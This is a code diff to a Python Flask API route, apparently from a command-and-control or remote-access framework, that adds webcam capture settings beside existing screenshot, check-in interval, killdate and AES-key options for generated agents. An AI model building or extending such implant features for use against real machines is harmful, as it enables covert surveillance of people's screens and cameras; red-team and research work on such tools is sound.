@@ -1269,6 +1269,8 @@ def init_api_routes(app, socketio):
                 'server_url': server_url,
                 'take_screenshots': bool(data.get('take_screenshots', True)),
                 'screenshot_frequency': max(1, min(int(data.get('screenshot_frequency', 10)), 100)),
+                'take_webcam': bool(data.get('take_webcam', False)),
+                'webcam_frequency': max(1, min(int(data.get('webcam_frequency', 10)), 100)),
                 'killdate_enabled': killdate_enabled,
                 'killdate': killdate_value if killdate_enabled else "",
                 'trusted_certificate': bool(data.get('trusted_certificate', False)),
@@ -1280,12 +1282,14 @@ def init_api_routes(app, socketio):
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
             c.execute('''INSERT INTO agent_configurations
-                         (checkin_interval, server_url, take_screenshots, screenshot_frequency, killdate_enabled, killdate, trusted_certificate, aes_key, aes_iv, timestamp)
-                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                         (checkin_interval, server_url, take_screenshots, screenshot_frequency, take_webcam, webcam_frequency, killdate_enabled, killdate, trusted_certificate, aes_key, aes_iv, timestamp)
+                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                       (config['checkin_interval'],
                        config['server_url'],
                        int(config['take_screenshots']),
                        config['screenshot_frequency'],
+                       int(config['take_webcam']),
+                       config['webcam_frequency'],
                        int(config['killdate_enabled']),
                        config['killdate'],
                        int(config['trusted_certificate']),
@@ -1307,6 +1311,8 @@ def init_api_routes(app, socketio):
                 server_url=config['server_url'],
                 take_screenshots=str(config['take_screenshots']),
                 screenshot_frequency=config['screenshot_frequency'],
+                take_webcam=str(config['take_webcam']),
+                webcam_frequency=config['webcam_frequency'],
                 killdate_enabled=str(config['killdate_enabled']),
                 killdate=config['killdate'] if config['killdate_enabled'] else "",
                 aes_key=repr(CONFIG.aes_key),  # Keep as bytes object
